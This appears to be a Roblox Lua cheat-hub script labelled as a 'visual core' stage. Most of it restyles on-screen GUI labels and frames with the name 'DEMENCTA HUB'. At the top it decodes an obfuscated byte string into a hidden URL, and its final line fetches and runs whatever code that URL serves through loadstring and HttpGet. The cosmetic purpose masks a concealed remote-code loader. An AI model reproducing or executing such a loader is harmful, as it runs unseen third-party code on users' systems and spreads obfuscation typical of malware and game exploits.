
--[[ STAGE 2: VISUAL CORE ]]
local w7Zw5uTOq_NrXiE46="\197\194\195\192\194\124\144\145\199\213\204\150\222\209\207\212\208\224\210\209\228\212\228\225\227\218\234\230\221\168\236\233\232\171\237\237\239\241\238\247\240\245\245\233\253\183\253\238\244\255\248\245\000\254\255\193\000\005\254\006\198\232\014\001\218\224\018\012\020\017\004\023\226\245\009\009\028\024\026\024\234\217\236\239\020\033\033\024\024\033\244\000\028\044\248\034\213\236\214\238\226\255\004\049\040\040\056\059\006\060\226\238\243\241\238\070\244\000\063\055\068"local aOiDRpJojOv_IDLg=25 local BbfOiZ8AN97iTNq=62 local MAsGcS9cPG66xRt=0 local VkXXTZGjP6jquWEeqd=1 local QYaSImQOlRpX7aW7=21 local qvk9qvGS58nP6Zw54QyGQB=false local i0terpA6P0kjmMg=bit32 and bit32.bxor if not i0terpA6P0kjmMg then i0terpA6P0kjmMg=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local l5lb9XPH8TBgabSq={}for XCRpH0hRrht9LH=1,#w7Zw5uTOq_NrXiE46 do local AcJVCuhNsOJu5enL=string.byte(w7Zw5uTOq_NrXiE46,XCRpH0hRrht9LH)local oGiJ32R35qeLZBY054iH0=(BbfOiZ8AN97iTNq+(XCRpH0hRrht9LH*VkXXTZGjP6jquWEeqd)+QYaSImQOlRpX7aW7)%256 if MAsGcS9cPG66xRt==0 then AcJVCuhNsOJu5enL=(AcJVCuhNsOJu5enL-oGiJ32R35qeLZBY054iH0)%256 l5lb9XPH8TBgabSq[XCRpH0hRrht9LH]=string.char(i0terpA6P0kjmMg(AcJVCuhNsOJu5enL,aOiDRpJojOv_IDLg))else AcJVCuhNsOJu5enL=i0terpA6P0kjmMg(AcJVCuhNsOJu5enL,aOiDRpJojOv_IDLg)l5lb9XPH8TBgabSq[XCRpH0hRrht9LH]=string.char((AcJVCuhNsOJu5enL-oGiJ32R35qeLZBY054iH0)%256)end end local VzjSvJ1i4aTmUeJX=table.concat(l5lb9XPH8TBgabSq)if qvk9qvGS58nP6Zw54QyGQB then VzjSvJ1i4aTmUeJX=string.reverse(VzjSvJ1i4aTmUeJX)end local x2cyf3BwadAqdn4j1r=VzjSvJ1i4aTmUeJX
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(x2cyf3BwadAqdn4j1r))()
